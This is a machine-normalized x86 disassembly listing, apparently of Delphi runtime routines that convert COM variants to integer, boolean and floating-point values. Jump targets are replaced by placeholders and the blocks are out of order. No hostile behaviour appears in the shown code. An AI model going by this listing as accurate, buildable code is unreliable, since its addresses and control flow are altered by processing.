cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x10
mov ax 0x1
call sub_40eb08
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x5
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_4103f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40ff1c
mov ebx eax
add ebx 0x80
cmp ebx 0xff
jbe r-xdata
add ebx 0xffffff80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_40316c
sub_41041c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x11
mov ax 0x1
call sub_40eb08
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x6
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_41049f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40ff1c
mov ebx eax
cmp ebx 0xff
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_40316c
sub_4104c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
xor eax eax
push ebp
push sub_410598
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40ff1c
mov ebx eax
add ebx 0x8000
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_4104ea ]
jmp [ eax * 4 + jump_table_4104fc ]
add ebx 0xffff8000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_40316c
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x2
mov ax 0x1
call sub_40eb08
sub_4105bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
xor eax eax
push ebp
push sub_410671
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40ff1c
mov ebx eax
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_4105de ]
jmp [ eax * 4 + jump_table_4105f1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_40316c
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x12
mov ax 0x1
call sub_40eb08
sub_410694
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x13
ja r-xdata
xor eax eax
push ebp
push sub_410759
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4109e0
test edx edx
je r-xdata
mov al [ eax + lookup_table_4106ba ]
jmp [ eax * 4 + jump_table_4106ce ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_40316c
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x13
mov ax 0x1
call sub_40eb08
sub_41077c
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ esp + 0x10 ]
call sub_4029fc
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x18
pop ebx
retn
mov dx [ ebx ]
mov cx 0x14
call sub_40ef48
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0x0
mov eax ebx
call sub_410fdc
and eax 0x7f
xor edx edx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
sub_410828
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_410916
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412fa4
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404290
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_4084f4
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41091d
lea eax [ ebp - 0x1c ]
call sub_404008
lea eax [ ebp - 0xc ]
call sub_404714
retn
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ ebp - 0x18 ]
call sub_4029fc
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov dx [ ebx ]
mov cx 0x14
call sub_40ef48
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax ebx
call sub_410fdc
and eax 0x7f
xor edx edx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
sub_410928
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41097f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f614
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_4109e0
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410986
lea eax [ ebp - 0x18 ]
call sub_40f2ec
retn
sub_410994
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_415978
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x14
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_4109e0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_410dec
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410a13 ]
mov eax [ ebp - 0x4 ]
call sub_410828
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
dec dx
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_4029fc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_4029fc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_4029fc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_4029fc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410828
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_4109e0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41077c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410928
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov dx 0x14
mov ax 0x1
call sub_40eb08
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_410994
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_41077c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
call sub_41077c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_410c37 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_4029fc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_4029fc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_4029fc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_4029fc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410828
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_4109e0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_410e24
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_410edb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412fa4
lea eax [ ebp - 0xa ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_404290
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x1 ]
call sub_4085e0
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410ee2
lea eax [ ebp - 0x10 ]
call sub_404008
lea eax [ ebp - 0x8 ]
call sub_404714
retn
mov dx [ ebx ]
mov cx 0xb
mov eax 0x80020005
call sub_40ef48
jmp r-xdata
mov dx [ ebx ]
mov cx 0xb
call sub_40ef48
cmp [ ebp - 0xa ] 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
jmp r-xdata
sub_410eec
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0xb
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0xb
call sub_40ef48
cmp [ esp + 0x8 ] 0x1
sbb eax eax
inc eax
add esp 0x10
pop ebx
retn
sub_410f2c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410f80
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x11 ]
call sub_40f614
lea eax [ ebp - 0x11 ]
call [ rw-data ]
lea eax [ ebp - 0x11 ]
call sub_410fdc
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410f87
lea eax [ ebp - 0x11 ]
call sub_40f2ec
retn
sub_410f90
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_415978
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0xb
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
cmp [ esp + 0xc ] 0x1
sbb eax eax
inc eax
mov [ edi ] al
sub_410fdc
push ebx
push ecx
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410ff6 ]
mov eax ebx
call sub_410e24
mov [ esp ] al
jmp r-xdata
dec dx
je r-xdata
mov [ esp ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fild [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410e24
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_410fdc
mov [ esp ] al
jmp r-xdata
mov eax ebx
call sub_410eec
mov [ esp ] al
jmp r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov eax ebx
call sub_410f2c
mov [ esp ] al
jmp r-xdata
jmp r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov dx 0xb
mov ax 0x1
call sub_40eb08
setne al
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_410f90
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_410eec
mov [ esp ] al
mov eax ebx
call sub_410eec
mov [ esp ] al
jmp r-xdata
jmp [ eax * 4 + jump_table_4111b8 ]
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410e24
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_410fdc
mov [ esp ] al
jmp r-xdata
setne al
mov [ esp ] al
jmp r-xdata
cmp [ eax ] 0x0
sub_411330
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4113e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412fa4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404290
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_409824
test al al
je r-xdata
sub edx 0x7ffdfffb
jne r-xdata
mov dx [ ebx ]
mov cx 0x5
mov eax 0x80020005
call sub_40ef48
jmp r-xdata
fld [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov dx [ ebx ]
mov cx 0x5
call sub_40ef48
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4113ec
lea eax [ ebp - 0x1c ]
call sub_404008
lea eax [ ebp - 0xc ]
call sub_404714
retn
sub_4113f4
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x5
call sub_40ef48
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_411440
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411495
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f614
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_4114f0
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41149c
lea eax [ ebp - 0x18 ]
call sub_40f2ec
retn
sub_4114a4
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_415978
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x5
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_4114f0
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41150c ]
mov eax ebx
call sub_411330
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
fild [ ebx + 0x8 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_411330
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4114f0
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4113f4
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411440
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x5
mov ax 0x1
call sub_40eb08
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_4114a4
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_4113f4
fstp [ esp ]
fwait
mov eax ebx
call sub_4113f4
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4116e9 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
